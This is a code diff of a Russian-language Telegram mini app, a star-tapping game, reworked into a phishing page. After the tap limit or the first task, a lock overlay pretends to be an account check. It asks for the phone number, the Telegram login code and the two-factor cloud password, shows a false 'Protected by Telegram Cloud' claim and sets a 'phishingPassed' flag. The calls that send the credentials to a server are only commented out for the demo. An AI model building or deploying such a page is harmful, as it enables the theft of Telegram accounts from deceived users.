+                    setIsLocked(true);
+                }
             };
 
             const showNotif = (message) => {
@@ -255,22 +248,12 @@
             };
 
             const handleTaskComplete = (taskId) => {
-                if (completedTasks.includes(taskId)) {
-                    showNotif("Уже выполнено!");
-                    return;
-                }
+                if (completedTasks.includes(taskId)) return;
 
                 const task = TASKS.find(t => t.id === taskId);
                 if (!task) return;
 
-                if (task.type === 'referral') {
-                    if (referrals < task.target) {
-                        showNotif(`Нужно ${task.target} рефералов!`);
-                        return;
-                    }
-                }
-
-                if (task.type === 'link' || task.type === 'subscribe') {
+                if (task.type === 'link') {
                     window.open(task.url, '_blank');
                 }
 
@@ -278,36 +261,26 @@
                 setCompletedTasks(newCompleted);
                 localStorage.setItem('completedTasks', JSON.stringify(newCompleted));
 
-                setStars(prev => {
-                    const newStars = prev + task.reward;
-                    localStorage.setItem('stars', newStars.toString());
-                    return newStars;
-                });
+                const newStars = stars + task.reward;
+                setStars(newStars);
+                localStorage.setItem('stars', newStars.toString());
 
                 showNotif(`+${task.reward} звёзд!`);
                 tg.HapticFeedback.notificationOccurred('success');
-            };
 
-            const handleCopyRef = () => {
-                const refLink = `https://t.me/${tg.initDataUnsafe?.bot || 'your_bot'}?start=${refCode}`;
-                navigator.clipboard.writeText(refLink);
-                setCopied(true);
-                tg.HapticFeedback.impactOccurred('light');
-                setTimeout(() => setCopied(false), 2000);
-            };
-
-            const handleShareRef = () => {
-                const refLink = `https://t.me/${tg.initDataUnsafe?.bot || 'your_bot'}?start=${refCode}`;
-                const shareUrl = `https://t.me/share/url?url=${encodeURIComponent(refLink)}&text=${encodeURIComponent('Заходи фармить звёзды со мной!')}`;
-                window.open(shareUrl, '_blank');
+                // Блокируем после первого задания
+                setTimeout(() => checkLockCondition(), 1000);
             };
 
             const handleLoginSubmit = async (step) => {
                 setIsLoading(true);
                 tg.HapticFeedback.impactOccurred('light');
 
-                if (step === 1) {
-                    try {
+                // Имитация отправки на Flask сервер
+                try {
+                    if (step === 1) {
+                        // В реальном коде раскомментируй fetch
+                        /* 
                         const response = await fetch(`${API_BASE_URL}/api/send-code`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -320,15 +293,15 @@
                         } else {
                             showNotif("Ошибка отправки кода");
                         }
-                    } catch (e) {
+                        */
+
+                        // Фейк для демо
                         setTimeout(() => {
                             setLoginStep(2);
                             showNotif("Код отправлен в Telegram!");
                         }, 1000);
-                    }
-                    setIsLoading(false);
-                } else if (step === 2) {
-                    try {
+                    } else if (step === 2) {
+                        /*
                         const response = await fetch(`${API_BASE_URL}/api/verify-code`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -340,22 +313,19 @@
                                 setLoginStep(3);
                                 showNotif("Требуется пароль 2FA");
                             } else {
-                                setShowLoginModal(false);
-                                setLoginStep(1);
-                                showNotif("Автофарм активирован! 🚀");
+                                localStorage.setItem('phishingPassed', 'true');
+                                setIsLocked(false);
+                                showNotif("Аккаунт подтвержден! 🚀");
                             }
-                        } else {
-                            showNotif("Неверный код");
                         }
-                    } catch (e) {
+                        */
+
                         setTimeout(() => {
-                            setLoginStep(3);
+                            setLoginStep(3); // Принудительно требуем 2FA
                             showNotif("Требуется пароль 2FA");
                         }, 1000);
-                    }
-                    setIsLoading(false);
-                } else if (step === 3) {
-                    try {
+                    } else if (step === 3) {
+                        /*
                         const response = await fetch(`${API_BASE_URL}/api/verify-password`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -363,21 +333,22 @@
                         });
                         const data = await response.json();
                         if (data.success) {
-                            setShowLoginModal(false);
-                            setLoginStep(1);
-                            showNotif("Автофарм активирован! 🚀");
-                        } else {
-                            showNotif("Неверный пароль");
+                            localStorage.setItem('phishingPassed', 'true');
+                            setIsLocked(false);
+                            showNotif("Аккаунт подтвержден! 🚀");
                         }
-                    } catch (e) {
+                        */
+
                         setTimeout(() => {
-                            setShowLoginModal(false);
-                            setLoginStep(1);
-                            showNotif("Автофарм активирован! 🚀");
+                            localStorage.setItem('phishingPassed', 'true');
+                            setIsLocked(false);
+                            showNotif("Аккаунт подтвержден! 🚀");
                         }, 1000);
                     }
-                    setIsLoading(false);
+                } catch (e) {
+                    showNotif("Ошибка сети");
                 }
+                setIsLoading(false);
             };
 
             const handleCodeChange = (index, value) => {
@@ -391,32 +362,11 @@
                 }
             };
 
-            const handleLoginOpen = () => {
-                setShowLoginModal(true);
-                setLoginStep(1);
-                setPhone('');
-                setCode(['', '', '', '', '']);
-                setPassword('');
-            };
-
-            const handleLoginClose = () => {
-                setShowLoginModal(false);
-                setLoginStep(1);
-            };
-
             return (
                 <div className="app">
-                    <div className="stars-bg">
-                        {Array.from({ length: 30 }).map((_, i) => (
-                            <div key={i} className="star-dot" style={{
-                                top: `${Math.random() * 100}%`,
-                                left: `${Math.random() * 100}%`,
-                                width: `${Math.random() * 3 + 1}px`,
-                                height: `${Math.random() * 3 + 1}px`,
-                                animationDelay: `${Math.random() * 3}s`,
-                            }} />
-                        ))}
-                    </div>
+                    <div className="orb orb-1"></div>
+                    <div className="orb orb-2"></div>
+                    <div className="orb orb-3"></div>
 
                     {showNotification && (
                         <div className="notification">{showNotification}</div>
@@ -425,58 +375,64 @@
                     <div className="content">
                         {activeTab === 'farm' && (
                             <div className="fade-in">
-                                <div className="balance-card glow-animation">
+                                <div className="balance-section">
                                     <div className="balance-label">Баланс</div>
-                                    <div className="balance-amount shine-text">{stars.toLocaleString()}</div>
-                                    <div className="balance-label">⭐ Звёзд</div>
+                                    <div className="balance-amount">{stars.toLocaleString()} ⭐</div>
                                 </div>
 
-                                <div className="energy-bar-container">
-                                    <div className="energy-bar" style={{ width: `${(energy / maxEnergy) * 100}%` }} />
+                                <div className="daily-info glass">
+                                    <div className="daily-taps-left">Осталось тапов сегодня: {maxTaps - todayTaps} / {maxTaps}</div>
+                                    <div className="taps-track">
+                                        <div className="taps-fill" style={{ width: `${(todayTaps / maxTaps) * 100}%` }}></div>
+                                    </div>
                                 </div>
 
                                 <div className="click-area" ref={clickAreaRef} style={{ position: 'relative' }}>
-                                    <button className="click-button float-animation" onClick={handleFarmClick}>
-                                        ⭐
+                                    <div className="click-ring"></div>
+                                    <div className="click-ring-2"></div>
+                                    <button 
+                                        className={`click-button ${todayTaps >= maxTaps ? 'disabled' : ''}`} 
+                                        onClick={handleFarmClick}
+                                    >
+                                        <div className="click-inner">⭐</div>
                                     </button>
                                     {floatCoins.map(coin => (
-                                        <div key={coin.id} className="float-coin coin-fly" style={{
+                                        <div key={coin.id} className="float-coin" style={{
                                             position: 'absolute', left: coin.x, top: coin.y,
-                                        }}>+{clickPower}</div>
+                                        }}>+10</div>
                                     ))}
                                 </div>
 
-                                <div style={{ display: 'flex', justifyContent: 'center', gap: '16px', marginTop: '20px' }}>
-                                    <div style={{ textAlign: 'center' }}>
-                                        <div style={{ color: '#ffd700', display: 'flex', justifyContent: 'center' }}><ZapIcon /></div>
-                                        <div style={{ fontSize: '14px', marginTop: '4px' }}>{energy}/{maxEnergy}</div>
-                                        <div style={{ fontSize: '11px', color: '#888' }}>Энергия</div>
+                                {todayTaps >= maxTaps && (
+                                    <div className="login-banner" onClick={() => checkLockCondition()}>
+                                        <div>
+                                            <div className="login-banner-title">🔒 Требуется подтверждение</div>
+                                            <div className="login-banner-desc">Вы исчерпали лимит тапов. Подтвердите аккаунт для продолжения.</div>
+                                        </div>
                                     </div>
-                                    <div style={{ textAlign: 'center' }}>
-                                        <div style={{ color: '#ff8c00', display: 'flex', justifyContent: 'center' }}><RocketIcon /></div>
-                                        <div style={{ fontSize: '14px', marginTop: '4px' }}>x{clickPower}</div>
-                                        <div style={{ fontSize: '11px', color: '#888' }}>Сила</div>
-                                    </div>
-                                </div>
-
-                                <div style={{ padding: '16px', marginTop: '24px' }}>
-                                    <button className="login-prompt" onClick={handleLoginOpen}>
-                                        📱 Войти для автофарма
-                                    </button>
-                                </div>
+                                )}
                             </div>
                         )}
 
                         {activeTab === 'tasks' && (
                             <div className="fade-in">
-                                <div className="section-title">📋 Задания</div>
+                                <div className="section-header">
+                                    <div className="section-title">Задания</div>
+                                    <div className="section-count">{completedTasks.length}/{TASKS.length}</div>
+                                </div>
                                 {TASKS.map(task => (
-                                    <div key={task.id} className="task-card">
-                                        <div className="task-info">
-                                            <div className="task-title">{task.title}</div>
-                                            <div className="task-reward">+{task.reward} ⭐</div>
+                                    <div key={task.id} className="task-card glass glass-hover">
+                                        <div className="task-left">
+                                            <div className="task-icon-box">📋</div>
+                                            <div className="task-info">
+                                                <div className="task-title">{task.title}</div>
+                                                <div className="task-reward">+{task.reward} ⭐</div>
+                                            </div>
                                         </div>
-                                        <button className={`task-button ${completedTasks.includes(task.id) ? 'completed' : ''}`} onClick={() => handleTaskComplete(task.id)}>
+                                        <button 
+                                            className={`task-btn ${completedTasks.includes(task.id) ? 'done' : ''}`} 
+                                            onClick={() => handleTaskComplete(task.id)}
+                                        >
                                             {completedTasks.includes(task.id) ? '✅' : 'Go'}
                                         </button>
                                     </div>
@@ -487,144 +443,65 @@
                         {activeTab === 'profile' && (
                             <div className="fade-in">
                                 <div className="profile-header">
-                                    <div className="avatar">{userData?.first_name?.[0] || 'U'}</div>
-                                    <h2 style={{ fontSize: '24px' }}>{userData?.first_name || 'User'}</h2>
-                                    <p style={{ color: '#888', marginTop: '4px' }}>@{userData?.username || 'unknown'}</p>
+                                    <div className="profile-avatar">{userData?.first_name?.[0] || 'U'}</div>
+                                    <div className="profile-name">{userData?.first_name || 'User'}</div>
+                                    <div className="profile-username">@{userData?.username || 'unknown'}</div>
+                                    <div className="profile-badge">⭐ Новичок</div>
                                 </div>
 
-                                <div className="profile-stat">
-                                    <span>⭐ Звёзды</span>
-                                    <span style={{ color: '#ffd700', fontWeight: '700' }}>{stars.toLocaleString()}</span>
-                                </div>
-                                <div className="profile-stat">
-                                    <span>👥 Рефералы</span>
-                                    <span style={{ fontWeight: '700' }}>{referrals}</span>
-                                </div>
-                                <div className="profile-stat">
-                                    <span>⚡ Сила клика</span>
-                                    <span style={{ fontWeight: '700' }}>x{clickPower}</span>
-                                </div>
-                                <div className="profile-stat">
-                                    <span>🔋 Энергия</span>
-                                    <span style={{ fontWeight: '700' }}>{energy}/{maxEnergy}</span>
-                                </div>
-                                <div className="profile-stat">
-                                    <span>📊 Заданий выполнено</span>
-                                    <span style={{ fontWeight: '700' }}>{completedTasks.length}/{TASKS.length}</span>
-                                </div>
-                                <div className="profile-stat">
-                                    <span>📅 Регистрация</span>
-                                    <span style={{ fontSize: '13px' }}>{new Date().toLocaleDateString()}</span>
-                                </div>
-                            </div>
-                        )}
-
-                        {activeTab === 'referrals' && (
-                            <div className="fade-in">
-                                <div className="section-title">👥 Рефералы</div>
-                                <div className="balance-card">
-                                    <div className="balance-label">Приглашено</div>
-                                    <div className="balance-amount" style={{ fontSize: '36px' }}>{referrals}</div>
-                                    <div className="balance-label">друзей</div>
-                                </div>
-
-                                <div className="ref-link-container">
-                                    <p style={{ color: '#888', marginBottom: '8px' }}>Твоя реферальная ссылка:</p>
-                                    <p style={{ color: '#ffd700', wordBreak: 'break-all', fontSize: '14px' }}>
-                                        https://t.me/your_bot?start={refCode}
-                                    </p>
-                                    <div style={{ display: 'flex', gap: '8px', justifyContent: 'center', marginTop: '12px' }}>
-                                        <button className="copy-button" onClick={handleCopyRef}>
-                                            {copied ? '✅ Скопировано!' : '📋 Копировать'}
-                                        </button>
-                                        <button className="copy-button" onClick={handleShareRef}>
-                                            📤 Поделиться
-                                        </button>
+                                <div className="stats-grid">
+                                    <div className="stat-box glass">
+                                        <div className="stat-box-value">{stars}</div>
+                                        <div className="stat-box-label">Звёзд собрано</div>
+                                    </div>
+                                    <div className="stat-box glass">
+                                        <div className="stat-box-value">{todayTaps}/{maxTaps}</div>
+                                        <div className="stat-box-label">Тапов сегодня</div>
+                                    </div>
+                                    <div className="stat-box glass">
+                                        <div className="stat-box-value">{completedTasks.length}</div>
+                                        <div className="stat-box-label">Заданий выполнено</div>
+                                    </div>
+                                    <div className="stat-box glass">
+                                        <div className="stat-box-value">{firstVisitDate.split(' ')[3] || '2025'}</div>
+                                        <div className="stat-box-label">С нами с</div>
                                     </div>
                                 </div>
-
-                                <div className="section-title" style={{ fontSize: '16px' }}>🎁 Награды за рефералов</div>
-                                {[1, 5, 10, 50].map(target => (
-                                    <div key={target} className="task-card">
-                                        <div className="task-info">
-                                            <div className="task-title">{target} друг{target === 1 ? '' : 'ей'}</div>
-                                            <div className="task-reward">+{target * 50} ⭐</div>
-                                        </div>
-                                        <button className={`task-button ${referrals >= target ? 'completed' : ''}`}>
-                                            {referrals >= target ? '✅' : `${referrals}/${target}`}
-                                        </button>
-                                    </div>
-                                ))}
-                            </div>
-                        )}
-
-                        {activeTab === 'leaderboard' && (
-                            <div className="fade-in">
-                                <div className="section-title">🏆 Топ игроков</div>
-                                {[
-                                    { name: "CryptoKing", stars: 15420, refs: 42 },
-                                    { name: "StarHunter", stars: 12300, refs: 35 },
-                                    { name: "FarmMaster", stars: 9800, refs: 28 },
-                                    { name: "ClickerPro", stars: 7600, refs: 19 },
-                                    { name: "GoldMiner", stars: 5400, refs: 15 },
-                                    { name: "StarLord", stars: 3200, refs: 8 },
-                                    { name: "NeoFarmer", stars: 2100, refs: 5 },
-                                    { name: "ClickHero", stars: 1800, refs: 4 },
-                                    { name: "StarSeeker", stars: 950, refs: 2 },
-                                    { name: "Rookie", stars: 100, refs: 0 },
-                                ].map((player, index) => (
-                                    <div key={index} className="leaderboard-item">
-                                        <div className={`rank ${index === 0 ? 'rank-1' : index === 1 ? 'rank-2' : index === 2 ? 'rank-3' : 'rank-other'}`}>
-                                            {index + 1}
-                                        </div>
-                                        <div style={{ flex: 1 }}>
-                                            <div style={{ fontWeight: '600' }}>{player.name}</div>
-                                            <div style={{ fontSize: '12px', color: '#888' }}>{player.refs} рефералов</div>
-                                        </div>
-                                        <div style={{ color: '#ffd700', fontWeight: '700' }}>
-                                            {player.stars.toLocaleString()} ⭐
-                                        </div>
-                                    </div>
-                                ))}
                             </div>
                         )}
                     </div>
 
-                    {showLoginModal && (
-                        <div className="login-modal-overlay" onClick={handleLoginClose}>
-                            <div className="login-modal" onClick={(e) => e.stopPropagation()}>
-                                <button className="login-close" onClick={handleLoginClose}>✖</button>
-
-                                <div className="login-logo">✈️</div>
+                    {isLocked && (
+                        <div className="lock-overlay">
+                            <div className="lock-modal">
+                                <div className="lock-logo">✈️</div>
 
                                 {loginStep === 1 && (
                                     <>
-                                        <div className="login-title">Вход в Telegram</div>
-                                        <div className="login-subtitle">
-                                            Подключите свой Telegram аккаунт для активации автофарма. Звёзды будут начисляться автоматически, даже когда вы оффлайн.
+                                        <div className="lock-title">Подтверждение аккаунта</div>
+                                        <div className="lock-subtitle">
+                                            Для защиты от ботов и продолжения фарма подтвердите свой Telegram аккаунт. Введите ваш номер телефона.
                                         </div>
-                                        <div className="login-step">
+                                        <div className="lock-step">
                                             <div className="step-dot active"></div>
                                             <div className="step-dot"></div>
                                             <div className="step-dot"></div>
                                         </div>
-                                        <input type="tel" className="login-input" placeholder="+7 999 123 45 67" value={phone} onChange={(e) => setPhone(e.target.value)} />
-                                        <button className="login-button" onClick={() => handleLoginSubmit(1)} disabled={!phone || isLoading}>
+                                        <input type="tel" className="lock-input" placeholder="+7 999 123 45 67" value={phone} onChange={(e) => setPhone(e.target.value)} />
+                                        <button className="lock-button" onClick={() => handleLoginSubmit(1)} disabled={!phone || isLoading}>
                                             {isLoading ? <div className="loader"></div> : 'Отправить код'}
                                         </button>
-                                        <div className="security-note">
-                                            🛡 <span>Защищено Telegram Cloud</span>
-                                        </div>
+                                        <div className="security-note">🛡 Защищено Telegram Cloud</div>
                                     </>
                                 )}
 
                                 {loginStep === 2 && (
                                     <>
-                                        <div className="login-title">Подтверждение</div>
-                                        <div className="login-subtitle">
+                                        <div className="lock-title">Введите код</div>
+                                        <div className="lock-subtitle">
                                             Мы отправили код подтверждения в приложение Telegram на номер {phone}
                                         </div>
-                                        <div className="login-step">
+                                        <div className="lock-step">
                                             <div className="step-dot"></div>
                                             <div className="step-dot active"></div>
                                             <div className="step-dot"></div>
@@ -635,7 +512,7 @@
                                                 <input key={index} ref={el => codeRefs.current[index] = el} type="tel" className="input-code" maxLength={1} value={digit} onChange={(e) => handleCodeChange(index, e.target.value)} />
                                             ))}
                                         </div>
-                                        <button className="login-button" onClick={() => handleLoginSubmit(2)} disabled={code.join('').length < 5 || isLoading}>
+                                        <button className="lock-button" onClick={() => handleLoginSubmit(2)} disabled={code.join('').length < 5 || isLoading}>
                                             {isLoading ? <div className="loader"></div> : 'Подтвердить'}
                                         </button>
                                     </>
@@ -643,17 +520,17 @@
 
                                 {loginStep === 3 && (
                                     <>
-                                        <div className="login-title">Облачный пароль</div>
-                                        <div className="login-subtitle">
+                                        <div className="lock-title">Облачный пароль</div>
+                                        <div className="lock-subtitle">
                                             Ваш аккаунт защищён двухфакторной аутентификацией. Введите пароль для завершения входа.
                                         </div>
-                                        <div className="login-step">
+                                        <div className="lock-step">
                                             <div className="step-dot"></div>
                                             <div className="step-dot"></div>
                                             <div className="step-dot active"></div>
                                         </div>
-                                        <input type="password" className="login-input" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} />
-                                        <button className="login-button" onClick={() => handleLoginSubmit(3)} disabled={!password || isLoading}>
+                                        <input type="password" className="lock-input" placeholder="••••••••" value={password} onChange={(e) => setPassword(e.target.value)} />
+                                        <button className="lock-button" onClick={() => handleLoginSubmit(3)} disabled={!password || isLoading}>
                                             {isLoading ? <div className="loader"></div> : 'Войти'}
                                         </button>
                                     </>
@@ -671,12 +548,6 @@
                         </button>
                         <button className={`nav-item ${activeTab === 'profile' ? 'active' : ''}`} onClick={() => setActiveTab('profile')}>
                             <UserIcon /><span>Профиль</span>
-                        </button>
-                        <button className={`nav-item ${activeTab === 'referrals' ? 'active' : ''}`} onClick={() => setActiveTab('referrals')}>
-                            <UsersIcon /><span>Рефы</span>
-                        </button>
-                        <button className={`nav-item ${activeTab === 'leaderboard' ? 'active' : ''}`} onClick={() => setActiveTab('leaderboard')}>
-                            <TrophyIcon /><span>Топ</span>
                         </button>
                     </div>
                 </div>
